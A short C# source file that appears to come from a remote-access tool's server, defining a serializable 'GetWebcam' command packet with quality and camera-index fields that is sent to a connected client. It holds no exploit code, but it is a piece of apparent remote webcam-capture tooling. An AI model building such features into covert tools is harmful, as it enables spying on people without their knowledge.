using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetWebcam : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetWebcam;
            }
        }

        [Index(0)]
        public virtual int quality { get; set; }

        [Index(1)]
        public virtual int webcam { get; set; }

        public GetWebcam()
        {
        }

        public GetWebcam(int quality, int webcam)
        {
            this.quality = quality;
            this.webcam = webcam;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
